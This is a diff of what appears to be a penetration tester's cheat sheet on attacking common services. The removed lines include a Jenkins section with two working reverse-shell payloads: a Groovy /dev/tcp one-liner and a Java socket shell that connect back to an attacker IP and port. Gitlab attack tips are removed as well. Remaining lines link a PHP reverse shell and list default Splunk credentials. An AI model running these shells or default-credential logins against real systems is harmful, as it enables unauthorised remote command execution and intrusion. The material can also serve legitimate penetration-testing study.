@@ -190,27 +190,6 @@ if (request.getParameter("cmd") != null) {
 ## PHP
 - [https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php\_reverse\_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php) - reverse shell (cross platform)
 
-## Jenkins
-- Continues integration server for development
-- Will often not require any authntication
-- Can run arbitrary commands via Apache Groovy scripts in the Script Console at `/script`
-- Linux reverse shell:
-
-```sh
-r = Runtime.getRuntime()
-p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{kali_ip}/{kali_port};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
-p.waitFor()
-```
-
-- Windows reverse shell:
-
-```sh
-String host="{kali_ip}";
-int port={kali_port};
-String cmd="cmd.exe";
-Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
-```
-
 ## Splunk
 - Will often not require authentication, or with defaults `admin:changeme` or  `admin:admin/Welcome/Welcome1`
   - This occurs due to Splunk automatically changing to be a free version after 60 days  without payment
@@ -254,12 +233,6 @@ interval = 10
   - This email can then be used to sign up for tools like Slack, Gitlab, Mattermost, Rocket.chat, Bitbucket, etc.
 - Useful for obtaining IT/helpdesk domain users from submitting non-relevant tickets
 - Some CVEs associated as well
-
-## Gitlab
-- Useful for finding sensitive info, like passwords or SSH keys
-- `/help` for fingerprinting version after being logged in
-  - Only vuln I'd try without auth would be the critical [account takeover](https://gitlab.com/gitlab-org/gitlab/-/issues/436084)
-- Attempt to self-singup at `/users/sign_up`
 
 ## ColdFusion
 - Programming language and dev platorm based on Java, meant to be hooked up to databases
